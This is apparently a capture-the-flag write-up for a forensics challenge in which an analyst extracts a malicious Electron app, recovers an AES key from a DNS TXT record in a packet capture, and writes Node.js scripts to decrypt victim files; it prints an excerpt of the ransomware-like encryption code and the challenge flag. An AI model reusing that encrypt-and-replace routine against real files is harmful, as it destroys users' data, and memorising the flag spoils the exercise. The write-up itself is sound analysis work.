# TokenCity-RogueCommit CTF Writeup

## Overview
The objective of this CTF challenge was to investigate a suspicious application, determine how it altered user files, recover encryption materials from a network capture, and decrypt the victim's data to find the hidden flag. The provided files were a zip archive containing user artifacts (`users_artifacts.zip`) and a packet capture (`traffic.pcapng`).

## Step 1: Initial Triage and Extraction
First, we created a workspace and extracted the provided archives:
```bash
mkdir -p /home/kali/ctf_workspace && cd /home/kali/ctf_workspace
unzip /home/kali/attachments-1777315926968-1778253980958.zip
unzip users_artifacts.zip
```
Reviewing the extracted files revealed an interesting artifact: an Electron application archive located at `Users/developer/Downloads/app.asar`.

## Step 2: Analyzing the Malicious Application
We extracted the `app.asar` archive to analyze the source code of the suspicious application:
```bash
npx asar extract Users/developer/Downloads/app.asar extracted_asar
```

Inside the extracted archive, we analyzed the core logic files, particularly `main.js`. The source code revealed a ransomware-like mechanism that targets files in the user's Documents directory:

```javascript
// Excerpt from main.js
const IV = Buffer.from('4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b', 'hex')
const FLAG_DOMAIN = 'free-ai-assistant.xyz'
const TARGET_DIR = path.join('C:', 'Users', 'developer', 'Documents')

function getKeyFromDNS(domain, callback) {
  dns.resolveTxt(domain, (err, records) => {
    const key = records.flat().join('')
    callback(key)
  })
}

function encryptFile(inputPath, keyString) {
  const key = Buffer.from(keyString, 'hex').slice(0, 32)
  const fileBuffer = fs.readFileSync(inputPath)
  const cipher = crypto.createCipheriv('aes-256-cbc', key, IV)
  const encrypted = Buffer.concat([cipher.update(fileBuffer), cipher.final()])
  const newPath = inputPath.replace(/\.[^.]+$/, '.bin')
  fs.writeFileSync(newPath, encrypted)
  // ... (deletes original file)
}
```

Key findings from the source code:
*   **Initialization Vector (IV):** `4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b` (hex)
*   **Key Delivery Mechanism:** The malware fetches the encryption key via a DNS TXT record query for the domain `free-ai-assistant.xyz`.
*   **Target:** Files in the Documents directory are encrypted and renamed with a `.bin` extension.
*   **Cipher Algorithm (Declared):** `aes-256-cbc`

## Step 3: Network Traffic Analysis
Knowing the malware uses DNS to retrieve the key, we analyzed the provided packet capture (`traffic.pcapng`) using `tshark` to find the TXT response for the target domain:

```bash
tshark -r traffic.pcapng -Y "dns.qry.name == free-ai-assistant.xyz && dns.qry.type == 16" -T fields -e dns.txt
```

**Result:** `5f4514434fc47f1f661d8a73806fd436`

This gave us the hex string used as the encryption key.

## Step 4: Resolving the Cipher Discrepancy
The source code stated `aes-256-cbc` was used, which strictly requires a 32-byte key. However, the key extracted from the DNS capture (`5f4514434fc47f1f661d8a73806fd436`) is 32 hex characters long, which equals only 16 bytes. 

If executed locally in Node.js, attempting to use a 16-byte key with `aes-256-cbc` throws an `Invalid key length` error. This meant the malware on the victim's machine must have successfully executed under different conditions or with a different cipher.

We wrote a small test script to attempt decryption using variations, testing `aes-128-cbc` alongside `aes-256-cbc` with manipulated keys:

```javascript
// decrypt_test.js
const fs = require('fs');
const crypto = require('crypto');

const IV = Buffer.from('4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b', 'hex');
const fileBuffer = fs.readFileSync('/home/kali/ctf_workspace/Users/developer/Documents/notes.bin');
const keyHex = '5f4514434fc47f1f661d8a73806fd436';

try {
  const decipher = crypto.createDecipheriv('aes-128-cbc', Buffer.from(keyHex, 'hex'), IV);
  let decrypted = decipher.update(fileBuffer);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  console.log("Success (aes-128-cbc)! Preview:", decrypted.slice(0, 32).toString('utf8'));
} catch (e) {
  console.log("Failed:", e.message);
}
```

Running this script successfully decrypted a portion of `notes.bin`, confirming that the files were actually encrypted using **`aes-128-cbc`**.

## Step 5: Decrypting the Victim's Files
With the correct algorithm (`aes-128-cbc`), Key (`5f4514434fc47f1f661d8a73806fd436`), and IV (`4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b`), we created a Node.js script to automate the decryption of all `.bin` files in the victim's Documents folder.

```javascript
// decrypt_all.js
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

const IV = Buffer.from('4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b', 'hex');
const key = Buffer.from('5f4514434fc47f1f661d8a73806fd436', 'hex');
const targetDir = '/home/kali/ctf_workspace/Users/developer/Documents';

const files = fs.readdirSync(targetDir);
files.forEach(file => {
  if (file.endsWith('.bin')) {
    const inputPath = path.join(targetDir, file);
    const outputPath = path.join(targetDir, file.replace('.bin', '.txt'));
    try {
      const fileBuffer = fs.readFileSync(inputPath);
      const decipher = crypto.createDecipheriv('aes-128-cbc', key, IV);
      let decrypted = decipher.update(fileBuffer);
      decrypted = Buffer.concat([decrypted, decipher.final()]);
      fs.writeFileSync(outputPath, decrypted);
      console.log(`Decrypted ${file} to ${outputPath}`);
    } catch (e) {
      console.log(`Failed to decrypt ${file}:`, e.message);
    }
  }
});
```

Running the script decrypted several files, including `ai_research_division.txt`, `dataset_sources.txt`, `notes.txt`, and `vpn_credentials.txt`.

## Step 6: Finding the Flag
After reviewing the decrypted text files, we noticed that `ai_research_division.txt` could not be read as plain text. We used the `file` command to determine its true format:

```bash
file ai_research_division.txt
# Output: ai_research_division.txt: PDF document, version 1.6
```

We renamed the file to have a `.pdf` extension:
```bash
mv ai_research_division.txt ai_research_division.pdf
```

Upon opening and viewing the `ai_research_division.pdf` document, we found the flag printed on the cover page.

**Flag:** `THM{Wh0_Kn3w_AI_Apps_C4n_B3_m4lic10us}`